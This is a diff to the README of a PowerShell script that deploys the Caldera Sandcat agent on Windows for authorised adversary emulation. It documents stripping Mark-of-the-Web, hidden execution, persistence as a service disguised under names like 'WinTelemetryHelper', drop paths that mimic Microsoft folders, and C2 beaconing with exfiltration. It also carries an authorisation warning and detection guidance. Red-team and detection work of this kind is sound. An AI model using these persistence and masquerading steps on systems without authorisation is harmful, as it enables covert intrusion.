@@ -5,11 +5,9 @@
 
 ---
 
-## ⚠️ Authorisation Warning
+## Authorisation Warning
 
-This tooling is intended **exclusively** for use against systems you own or have explicit written authorisation to test. 
-Deploying agent software on systems without authorisation violates computer fraud laws in most jurisdictions (e.g., 
-CFAA, Computer Misuse Act, GDPR Article 32). The authors accept no liability for misuse.
+This tooling is intended **exclusively** for use against systems you own or have explicit written authorisation to test. Deploying agent software on systems without authorisation violates computer fraud laws in most jurisdictions (e.g., CFAA, Computer Misuse Act, GDPR Article 32). The authors accept no liability for misuse.
 
 ---
 
@@ -38,8 +36,7 @@ CFAA, Computer Misuse Act, GDPR Article 32). The authors accept no liability for
 3. Strips the Mark-of-the-Web (MotW) ADS via `Unblock-File`.
 4. Either spawns the agent as a hidden background process **or** installs it as a persistent Windows service (NSSM preferred, `sc.exe` fallback).
 
-The script is parameterised for lab, staging, and simulated production environments. It does **not** handle lateral 
-movement or credential material — deployment is expected to be driven by an orchestration layer (Ansible, GPO, SCCM, manual execution).
+The script is parameterised for lab, staging, and simulated production environments. It does **not** handle lateral movement or credential material — deployment is expected to be driven by an orchestration layer (Ansible, GPO, SCCM, manual execution).
 
 ---
 
@@ -62,8 +59,7 @@ movement or credential material — deployment is expected to be driven by an or
 └─────────────────────────────────┘
 ```
 
-The agent checks in on its configured beacon interval (default: 60 s jitter), receives tasks from the planner, executes 
-abilities, and exfiltrates results back to the server. All comms are over the selected C2 channel.
+The agent checks in on its configured beacon interval (default: 60 s jitter), receives tasks from the planner, executes abilities, and exfiltrates results back to the server. All comms are over the selected C2 channel.
 
 ---
 
@@ -85,21 +81,21 @@ abilities, and exfiltrates results back to the server. All comms are over the se
 | Administrator privileges | Required — the script enforces `#Requires -RunAsAdministrator` |
 | .NET Framework 4.5+ | Needed for `System.Net.WebClient`; present on all supported Windows versions |
 | Execution policy | Must allow script execution — see [Usage](#usage) |
-| NSSM *(optional)* | Recommended for service installation; download from [nssm.cc](https://nssm.cc) and place on `$PATH` |
+| NSSM *(auto-installed)* | **The script automatically downloads and installs NSSM** when `-InstallAsService` is used. If you prefer to install manually, download from [nssm.cc](https://nssm.cc) and place on `$PATH`. |
 
 ---
 
 ## Parameters
 
 | Parameter | Type | Required | Default | Description |
-|---|---|----------|---|---|
-| `-CalderaServer` | `string` | yes      | — | Base URL of the Caldera server including scheme and port. Must match `^https?://`. |
-| `-Group` | `string` | no       | `red` | Agent group to enrol into. Corresponds to Caldera's group concept used by adversary profiles. |
-| `-C2Channel` | `string` | no       | `http` | Contact channel for C2 comms. One of: `http`, `udp`, `tcp`, `websocket`. |
-| `-InstallAsService` | `switch` | no       | `$false` | Installs the agent as a persistent Windows service with auto-start. |
-| `-ServiceName` | `string` | no       | `CalderaSandcat` | Display and registry name for the Windows service. Rename for operational blending. |
-| `-AgentPath` | `string` | no       | `C:\Windows\Temp\sandcat.exe` | Filesystem path where the agent binary is written. |
-| `-Proxy` | `string` | no       | `""` | HTTP proxy URL for download and beacon traffic (e.g., `http://proxy.corp.local:8080`). |
+|---|---|---|---|---|
+| `-CalderaServer` | `string` | ✅ | — | Base URL of the Caldera server including scheme and port. Must match `^https?://`. |
+| `-Group` | `string` | ❌ | `red` | Agent group to enrol into. Corresponds to Caldera's group concept used by adversary profiles. |
+| `-C2Channel` | `string` | ❌ | `http` | Contact channel for C2 comms. One of: `http`, `udp`, `tcp`, `websocket`. |
+| `-InstallAsService` | `switch` | ❌ | `$false` | Installs the agent as a persistent Windows service with auto-start. |
+| `-ServiceName` | `string` | ❌ | `CalderaSandcat` | Display and registry name for the Windows service. Rename for operational blending. |
+| `-AgentPath` | `string` | ❌ | `C:\Windows\Temp\sandcat.exe` | Filesystem path where the agent binary is written. |
+| `-Proxy` | `string` | ❌ | `""` | HTTP proxy URL for download and beacon traffic (e.g., `http://proxy.corp.local:8080`). |
 
 ---
 
@@ -124,13 +120,13 @@ Set-ExecutionPolicy RemoteSigned -Scope Process -Force
 
 **Basic — ephemeral process, HTTP C2:**
 ```powershell
-.\Deploy-SandcatAgent.ps1 -CalderaServer "http://192.168.10.100:8888"
+.\Deploy-SandcatAgent.ps1 -CalderaServer "http://192.168.1.100:8888"
 ```
 
 **Specify group and C2 channel:**
 ```powershell
 .\Deploy-SandcatAgent.ps1 `
-    -CalderaServer "http://192.168.10.100:8888" `
+    -CalderaServer "http://192.168.1.100:8888" `
     -Group         "red" `
     -C2Channel     "websocket"
 ```
@@ -138,7 +134,7 @@ Set-ExecutionPolicy RemoteSigned -Scope Process -Force
 **Persistent service with a blended service name:**
 ```powershell
 .\Deploy-SandcatAgent.ps1 `
-    -CalderaServer  "http://192.168.10.100:8888" `
+    -CalderaServer  "http://192.168.1.100:8888" `
     -Group          "red" `
     -InstallAsService `
     -ServiceName    "WinTelemetryHelper"
@@ -147,14 +143,14 @@ Set-ExecutionPolicy RemoteSigned -Scope Process -Force
 **Egress via corporate proxy:**
 ```powershell
 .\Deploy-SandcatAgent.ps1 `
-    -CalderaServer "http://192.168.10.100:8888" `
+    -CalderaServer "http://192.168.1.100:8888" `
     -Proxy         "http://proxy.corp.local:8080"
 ```
 
 **Custom drop path:**
 ```powershell
 .\Deploy-SandcatAgent.ps1 `
-    -CalderaServer "http://192.168.10.100:8888" `
+    -CalderaServer "http://192.168.1.100:8888" `
     -AgentPath     "C:\ProgramData\Microsoft\WinSAT\sandcat.exe"
 ```
 
@@ -195,9 +191,20 @@ contacts:
 
 ## Persistence via Windows Service
 
-When `-InstallAsService` is passed, the script attempts two approaches in order:
+When `-InstallAsService` is passed, the script automatically downloads and installs NSSM if not already present, then uses it to wrap the agent as a proper Windows service.
 
-### Option A — NSSM (preferred)
+### Automatic NSSM Installation
+
+The script includes an `Install-NSSM` function that:
+1. Checks if `nssm.exe` is already on `$PATH`
+2. If not found, downloads NSSM 2.24 from [nssm.cc](https://nssm.cc)
+3. Extracts and installs to `C:\Tools\nssm`
+4. Adds `C:\Tools\nssm` to the system PATH (permanent)
+5. Verifies the installation succeeded
+
+This happens automatically when you pass `-InstallAsService` — no manual NSSM installation required.
+
+### Option A — NSSM (automatic)
 
 [NSSM](https://nssm.cc) wraps arbitrary executables as proper Windows services with restart supervision.
 
@@ -208,7 +215,7 @@ nssm set     <ServiceName> AppRestartDelay 5000
 nssm start   <ServiceName>
 ```
 
-NSSM is detected via `Get-Command nssm.exe`. Place it on `$PATH` or in the same directory as the script before running.
+The script auto-downloads NSSM when needed. If you prefer manual installation, download it and place `nssm.exe` anywhere on `$PATH` before running the script.
 
 ### Option B — `sc.exe` with batch wrapper (fallback)
 
@@ -256,8 +263,7 @@ These notes apply to purple team and red team scenarios where detection fidelity
 
 ## Detection Opportunities
 
-For blue team and detection engineering use: the following events are generated by this script and its resulting agent 
-activity. Validate that your SIEM/EDR stack captures them.
+For blue team and detection engineering use: the following events are generated by this script and its resulting agent activity. Validate that your SIEM/EDR stack captures them.
 
 | Event | Source | Details |
 |---|---|---|
@@ -299,6 +305,17 @@ Check that the `-Group` value exists in Caldera (or create it). Review `sandcat`
 
 **Service installs but immediately stops**  
 If using the `sc.exe` fallback, verify that `cmd.exe` can resolve the wrapper batch path. Run the batch file manually in a shell to observe the error. Consider installing NSSM instead.
+
+---
+
+## Contributing
+
+Pull requests are welcome. Please:
+
+- Test changes against Caldera ≥ 4.1 on Windows 10/11 and Windows Server 2019/2022.
+- Keep the script self-contained (no external module dependencies).
+- Follow [PowerShell best practices](https://docs.microsoft.com/en-us/powershell/scripting/developer/cmdlet/strongly-encouraged-development-guidelines) — approved verbs, `[CmdletBinding()]`, proper error handling.
+- Update this README if parameters or behaviour change.
 
 ---
 
